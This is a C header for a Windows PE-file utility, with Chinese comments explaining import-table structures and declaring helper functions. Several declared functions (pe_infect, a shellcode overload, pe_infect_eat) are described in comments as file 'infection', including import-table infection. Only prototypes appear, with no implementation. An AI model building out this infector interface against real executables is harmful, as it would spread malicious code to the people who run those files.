#ifndef _PE_
#define _PE_
#include "..\common\common.h"

//IMAGE_THUNK_DATA 这是一个DWORD类型的集合。通常我们将其解释为指向一个 IMAGE_IMPORT_BY_NAME 结构的指针,其定义如下：
//	IMAGE_THUNK_DATA{
//		union {
//			PBYTE ForwarderString;
//			PDWORD Function;
//			DWORD Ordinal;//判定当前结构数据是不是以序号为输出的，如果是的话该值为0x800000000,此时PIMAGE_IMPORT_BY_NAME不可做为名称使用
//			PIMAGE_IMPORT_BY_NAME AddressOfData;
//		}u1;
//} IMAGE_THUNK_DATA,*PIMAGE_THUNK_DATA;
//
//
//typedef struct _IMAGE_IMPORT_BY_NAME{
//	WORD Hint;// 函数输出序号
//	BYTE Name1[1];//输出函数名称
//} IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME

////这里通过RVA的最高位判断函数的导入方式，
////如果最高位为1，按序号导入，否则按名称导入
//if(pThunk[j].u1.AddressOfData & IMAGE_ORDINAL_FLAG32)
//{
// printf("\t [%d] \t %ld \t 按序号导入\n", j, pThunk[j].u1.AddressOfData & 0xffff);
//}
//else
//{
// //按名称导入，我们再次定向到函数序号和名称
// //注意其地址不能直接用，因为仍然是RVA！
// PIMAGE_IMPORT_BY_NAME pFuncName = (PIMAGE_IMPORT_BY_NAME)ImageRvaToVa(
//	 pNtHeaders,    lpBaseAddress,
//	 pThunk[j].u1.AddressOfData,
//	 NULL);

// printf("\t [%d] \t %ld \t %s\n", j, pFuncName->Hint, pFuncName->Name);
//}

PVOID
	ImageVaToRva(
	__in PIMAGE_NT_HEADERS NtHeaders,
	__in PVOID Base,
	__in ULONG Rva
	);

//返回的信息
typedef struct pe_retn_msg{
	//标志是否执行成功
	bool isSuccessed;
	//返回的错误信息
	TCHAR tsMsg[50];
}pe_retn_msg,*ppe_retn_msg;

//
PVOID pe_getMapViewOfFile(LPTSTR lpFilePath);

//查找目标程序有无目标模块
void pe_findDllModule(LPTSTR lpFilePath,LPSTR lpDllName,ppe_retn_msg p_msg);

//查找导出表目录
bool pe_findExportDir(LPTSTR lpFilePath);

//获得text段的偏移
DWORD pe_getTextSecOffset(PIMAGE_SECTION_HEADER pImage_section_header , int NumberOfSections);

//感染 
void pe_infect(LPTSTR lpFilePath,LPTSTR lpDllName,LPSTR lpFuncName,ppe_retn_msg p_msg);

//感染2
void pe_infect(LPTSTR lpFilePath,PBYTE lpShellCode,ppe_retn_msg p_msg,int size);

//导入表感染
void pe_infect_eat(LPTSTR lpFilePath,LPSTR lpDllName,LPSTR lpFuncName,ppe_retn_msg p_msg);

//
DWORD pe_getImportOriFuncAddressByOrdinal(PVOID lpBase,LPSTR lpDllName,DWORD dwOrdinal);

//
DWORD pe_getExportOriFuncAddressByOrdinal(PVOID lpBase,DWORD dwOrdinal);

#endif //_PE_